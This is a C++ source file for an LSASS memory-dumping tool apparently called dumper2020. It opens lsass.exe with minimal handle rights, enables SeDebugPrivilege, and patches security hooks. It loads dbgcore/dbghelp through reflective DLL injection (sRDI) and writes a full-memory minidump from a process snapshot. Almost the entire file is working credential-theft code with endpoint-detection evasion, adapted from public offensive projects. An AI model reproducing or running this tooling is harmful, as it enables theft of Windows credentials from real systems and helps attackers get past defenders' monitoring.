#include "dumper2020.h"
#include "whisper.h"
#include "proto.h"
#include "hooks.h"
#include "srdi.h"
#include <iostream>
using namespace std;

// Global functions
fnRtlInitUnicodeString RtlInitUnicodeString;
fnRtlEqualUnicodeString RtlEqualUnicodeString;
fnPssCaptureSnapshot PssCaptureSnapshot;
fnPssFreeSnapshot PssFreeSnapshot;

// Function:    Dump
// Description: Dump LSASS process memory to disk
// Arguments:   Pointer to wide char array containing dump file path
// Called from: main/DllMain
// Returns:     True if dump was successful
BOOL Dump(LPWSTR dumpPath)
{
    // Check requirements before anything else
    if (!Requirements())
        return FALSE;

    // Dynamically resolve RTL/PSS functions
    if (!ResolveFunctions())
        return FALSE;

    // Patch hooks as needed
    PatchHooks();

    // Status of the dump procedure
    BOOL status = FALSE;

    // Initialize handle to dump file
    HANDLE dump = NULL;

    // Create destination file
    if ((dump = CreateDumpFile(dumpPath)))
    {
        // Initialize LSASS PID variable
        DWORD lsassPid = 0;

        // Get LSASS PID
        if ((lsassPid = GetPid()))
        {
            // Initialize LSASS handle
            HANDLE lsass = NULL;

            // Open LSASS
            if ((lsass = GetHandle(lsassPid)))
            {
                wcout << "[+] Successfully opened LSASS, PID: " << lsassPid << endl;

                // Initialize handle to debug DLL loaded by sRDI
                HMODULE debugDll = NULL; 

                // Perform sRDI and get handle to debug DLL
                if ((debugDll = LoadDLL((LPSTR)GetDebugDLLPath().data())))
                {
                    // sRDI successful, get MiniDumpWriteDump function pointer
                    fnMiniDumpWriteDump MiniDumpWriteDump = (fnMiniDumpWriteDump)GetProcAddressR(debugDll, "MiniDumpWriteDump");

                    if (MiniDumpWriteDump)
                    {
                        // Result of LSASS snapshot attempt
                        DWORD snapshotResult = 0;

                        // Initialize handle to LSASS snapshot
                        HPSS snapshot = NULL;

                        // Capture snapshot of LSASS
                        if ((snapshotResult = PssCaptureSnapshot(lsass, (PSS_CAPTURE_FLAGS)snapshotFlags, CONTEXT_ALL, &snapshot)) == ERROR_SUCCESS)
                        {
                            wcout << "[+] Captured snapshot of LSASS process" << endl;
                            wcout << "[+] Dumping to: " << dumpPath << endl;

                            // Initialize MiniDumpWriteDump callback struct
                            MINIDUMP_CALLBACK_INFORMATION callbackInfo;
                            SecureZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
                            callbackInfo.CallbackRoutine = ATPMiniDumpWriteDumpCallback;
                            callbackInfo.CallbackParam = NULL;

                            // Perform the dump
                            if ((status = MiniDumpWriteDump(snapshot, NULL, dump, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo)))
                                wcout << "[+] Dump complete" << endl;
                            else
                                wcout << "[!] Dump failed: " << GetLastError() << endl;

                            // Free snapshot
                            PssFreeSnapshot(GetCurrentProcess(), snapshot);
                        }
                        else wcout << "[!] Failed to take snapshot of LSASS: " << snapshotResult << endl;
                    }
                    else wcout << "[!] Failed to locate MiniDumpWriteDump function" << endl;
                }
                else wcout << "[!] Failed to load debug DLL via sRDI" << endl;

                // Close LSASS handle
                NtClose(lsass);
            }
            else wcout << "[!] Failed to open LSASS" << endl;
        }
        else wcout << "[!] Failed to locate LSASS PID" << endl;

        // Close file handle
        NtClose(dump);

        if (!status)
        {
            // Dump failed, attempt to clean up
            if (DeleteDumpFile(dumpPath))
                wcout << "[+] Removed dump file" << endl;
            else
                wcout << "[!] Failed to remove dump file" << endl;
        }
    }
    else wcout << "[!] Failed to create dump file" << endl;

    return status;
}

// Function:    Requirements
// Description: Verify 64-bit architecture, elevated context, and SeDebugPrivilege (enable as needed)
// Called from: Dump
// Returns:     True if all requirements are met, false if any are not
BOOL Requirements()
{
    // 64-bit only
    if (sizeof(LPVOID) != 8)
    {
        wcout << "[!] 64-bit architecture only" << endl;
        return FALSE;
    }

    // Overall status of requirement checks
    BOOL status = FALSE;

    // Initialize handle to process token
    HANDLE token = NULL;

    // Open our token
    if (NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &token) == 0)
    {
        // Token elevation struct
        TOKEN_ELEVATION tokenElevation = { 0 };

        // Size of token elevation struct
        DWORD tokenElevationSize = sizeof(TOKEN_ELEVATION);

        // Get token elevation status
        if (NtQueryInformationToken(token, TokenElevation, &tokenElevation, sizeof(tokenElevation), &tokenElevationSize) == 0)
        {
            // Check if token is elevated
            if (tokenElevation.TokenIsElevated)
            {
                // Token is elevated, check/enable SeDebugPrivilege

                // Size of token privilege struct
                DWORD tokenPrivsSize = 0;

                // Get size of current privilege array
                if (NtQueryInformationToken(token, TokenPrivileges, NULL, NULL, &tokenPrivsSize) == 0xC0000023)
                {
                    // Allocate memory to store current token privileges
                    PTOKEN_PRIVILEGES tokenPrivs = (PTOKEN_PRIVILEGES)new BYTE[tokenPrivsSize];

                    // Get current token privileges
                    if (NtQueryInformationToken(token, TokenPrivileges, tokenPrivs, tokenPrivsSize, &tokenPrivsSize) == 0)
                    {
                        // Track whether or not token has SeDebugPrivilege
                        BOOL hasDebug = FALSE;

                        // Loop through privileges assigned to token to find SeDebugPrivilege
                        for (DWORD i = 0; i < tokenPrivs->PrivilegeCount; i++)
                        {
                            // SeDebugPrivilege LUID = 0x14
                            if (tokenPrivs->Privileges[i].Luid.LowPart == 0x14)
                            {
                                hasDebug = TRUE;

                                // Located SeDebugPrivilege, enable it if necessary
                                if (!(tokenPrivs->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED))
                                {
                                    tokenPrivs->Privileges[i].Attributes |= SE_PRIVILEGE_ENABLED;

                                    // Apply updated privilege struct to token
                                    if (NtAdjustPrivilegesToken(token, FALSE, tokenPrivs, tokenPrivsSize, NULL, NULL) == 0)
                                    {
                                        wcout << "[+] Enabled SeDebugPrivilege" << endl;
                                        status = TRUE;
                                        break;
                                    }
                                    else wcout << "[!] Failed to enable SeDebugPrivilege" << endl;
                                }
                                else
                                {
                                    wcout << "[+] SeDebugPrivilege already enabled" << endl;
                                    status = TRUE;
                                    break;
                                }
                            }
                        }

                        if (!hasDebug)
                            wcout << "[!] Token does not have SeDebugPrivilege" << endl;
                    }
                    else wcout << "[!] Failed to query token privileges" << endl;

                    // Free token privileges buffer
                    delete tokenPrivs;
                }
                else wcout << "[!] Failed to determine size of token privileges array" << endl;
            }
            else wcout << "[!] Administrative privileges required" << endl;
        }
        else wcout << "[!] Failed to query token elevation status" << endl;

        // Close token handle
        NtClose(token);
    }
    else wcout << "[!] Failed to open process token" << endl;

    return status;
}

// Function:    ResolveFunctions
// Description: Resolve addresses for NTDLL/Kernel32 functions
// Called from: Dump
// Returns:     True if all functions are resolved, false if any are not
BOOL ResolveFunctions()
{
    // Module handles
    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
    HMODULE kernel32 = GetModuleHandle(L"kernel32.dll");

    // Get function pointers
    RtlInitUnicodeString = (fnRtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
    RtlEqualUnicodeString = (fnRtlEqualUnicodeString)GetProcAddress(ntdll, "RtlEqualUnicodeString");
    PssCaptureSnapshot = (fnPssCaptureSnapshot)GetProcAddress(kernel32, "PssCaptureSnapshot");
    PssFreeSnapshot = (fnPssFreeSnapshot)GetProcAddress(kernel32, "PssFreeSnapshot");

    if (!RtlInitUnicodeString || !RtlEqualUnicodeString || !PssCaptureSnapshot || !PssFreeSnapshot)
        return FALSE;
    else
        return TRUE;
}

// Function:    GetPid
// Description: Get PID for lsass.exe
// Called from: Dump
// Returns:     PID, 0 on failure
DWORD GetPid()
{
    // LSASS PID
    DWORD pid = 0;

    // Size of process info table, set by NtQuerySystemInformation
    ULONG processInfoSize = 0;

    // Get size of the process table
    if (NtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &processInfoSize) == 0xC0000004)
    {
        // Initialize process info buffer
        LPVOID processInfoBuffer = NULL;

        // Get handle to heap
        HANDLE heap = GetProcessHeap();

        // Allocate memory for process info
        if ((processInfoBuffer = HeapAlloc(heap, HEAP_ZERO_MEMORY, processInfoSize)))
        {
            // Get process information
            if (NtQuerySystemInformation(SystemProcessInformation, processInfoBuffer, processInfoSize, &processInfoSize) == 0)
            {
                // Assign process info pointer to buffer
                PSYSTEM_PROCESSES processInfo = (PSYSTEM_PROCESSES)processInfoBuffer;

                // Create unicode string for "lsass.exe"
                UNICODE_STRING lsassString;
                RtlInitUnicodeString(&lsassString, L"lsass.exe");

                // Loop through processes until lsass.exe is found
                while (processInfo->NextEntryDelta)
                {
                    if (RtlEqualUnicodeString(&processInfo->ProcessName, &lsassString, TRUE))
                    {
                        // Found lsass.exe, capture the PID
                        pid = HandleToULong(processInfo->ProcessId);
                        break;
                    }

                    // Move pointer to next entry in the process table
                    processInfo = (PSYSTEM_PROCESSES)(((LPBYTE)processInfo) + processInfo->NextEntryDelta);
                }
            }
            else wcout << "[!] Failed to query system process information" << endl;

            // Free process info buffer
            HeapFree(heap, NULL, processInfoBuffer);
        }
        else wcout << "[!] Failed to allocate memory for system process information" << endl;

        // Close heap handle
        NtClose(heap);
    }
    else wcout << "[!] Failed to determine amount of memory needed for system process information" << endl;

    return pid;
}

// Function:    GetHandle
// Description: Open handle to the target process with minimum rights needed to perform a memory dump
// Arguments:   Target process PID
// Called from: Dump
// Returns:     Handle to target process, NULL on failure
HANDLE GetHandle(DWORD pid)
{
    // Initialize client ID and object attributes
    CLIENT_ID cid = { ULongToHandle(pid), NULL };
    OBJECT_ATTRIBUTES oa = { NULL, NULL, NULL, NULL };

    // Initialize process handle
    HANDLE handle = NULL;

    // Open the process
    NtOpenProcess(&handle, PROCESS_CREATE_PROCESS | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, &oa, &cid);

    // Return handle (or NULL on failure)
    return handle;
}

// Function:    GetDebugDLLPath
// Description: Construct path to DLL exporting MiniDumpWriteDump based on Windows version
// Called from: Dump
// Returns:     Path to debug DLL
string GetDebugDLLPath()
{
    // Get system directory, e.g. c:\windows\system32
    CHAR systemDir[MAX_PATH];
    UINT systemDirSize = GetSystemDirectoryA(systemDir, MAX_PATH);

    // Initialize string with system directory
    string path(systemDir, systemDirSize);

    path += "\\"; // Append slash

    // Append appropriate DLL name
    if (GetWinVersion() == 10)
        // Use dbgcore.dll with Windows 10
        path += "dbgcore.dll";
    else
        // Use dbghelp.dll for everything else
        path += "dbghelp.dll";

    return path;
}

// Function:    CreateDumpFile
// Description: Create dump file at specified location
// Arguments:   Pointer to wide char array containing destination file path
// Called from: Dump
// Returns:     Handle to dump file, NULL on failure
HANDLE CreateDumpFile(LPWSTR path)
{
    // Path to dump file in NT format
    wstring ntPath(L"\\??\\");
    ntPath += path;

    // Convert path wide string to unicode string
    UNICODE_STRING pathString;
    RtlInitUnicodeString(&pathString, ntPath.data());

    // File handle and structs
    HANDLE file = NULL;
    IO_STATUS_BLOCK ioStatusBlock;
    SecureZeroMemory(&ioStatusBlock, sizeof(ioStatusBlock));
    OBJECT_ATTRIBUTES fileObjectAttributes;
    InitializeObjectAttributes(&fileObjectAttributes, &pathString, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // Create dump file
    NtCreateFile(&file, FILE_GENERIC_WRITE, &fileObjectAttributes, &ioStatusBlock, 0, FILE_ATTRIBUTE_NORMAL,
                    FILE_SHARE_WRITE, FILE_CREATE, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

    // Return handle
    return file;
}

// Function:    DeleteDumpFile
// Description: Delete dump file
// Arguments:   Pointer to wide char array containing path to file to delete
// Called from: Dump
// Returns:     True on success
BOOL DeleteDumpFile(LPWSTR path)
{
    // Path to dump file in NT format
    wstring ntPath(L"\\??\\");
    ntPath += path;

    // Convert path wide string to unicode string
    UNICODE_STRING pathString;
    RtlInitUnicodeString(&pathString, ntPath.data());

    // File object attributes
    OBJECT_ATTRIBUTES fileObjectAttributes;
    InitializeObjectAttributes(&fileObjectAttributes, &pathString, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // Delete dump file
    if (NtDeleteFile(&fileObjectAttributes) != 0)
        // Failed to delete file
        return FALSE;
    else
        // File deleted
        return TRUE;
}

// Function:    GetWinVersion
// Description: Get Windows major version from KUSER_SHARED_DATA
// Called from: GetMiniDumpWriteDump
// Returns:     Major version, e.g. 5, 6, 10
// Source:      https://gist.github.com/slaeryan/2c73c4c4e33dfd7d8ce38312aacc9324
#define KUSER_SHARED_DATA 0x7ffe0000
#define MAJOR_VERSION_OFFSET 0x026C
DWORD GetWinVersion()
{
    return *(PULONG)(KUSER_SHARED_DATA + MAJOR_VERSION_OFFSET);
}

// Function:    ATPMiniDumpWriteDumpCallback
// Description: This function tells MiniDumpWriteDump that a PSS snapshot is being dumped
// Sources:     https://github.com/b4rtik/ATPMiniDump
//              https://docs.microsoft.com/en-us/previous-versions/windows/desktop/proc_snap/export-a-process-snapshot-to-a-file
BOOL CALLBACK ATPMiniDumpWriteDumpCallback(
    __in     PVOID CallbackParam,
    __in     const PMINIDUMP_CALLBACK_INPUT CallbackInput,
    __inout  PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
)
{
    switch (CallbackInput->CallbackType)
    {
    case 16: // IsProcessSnapshotCallback
        CallbackOutput->Status = S_FALSE;
        break;
    }
    return TRUE;
}
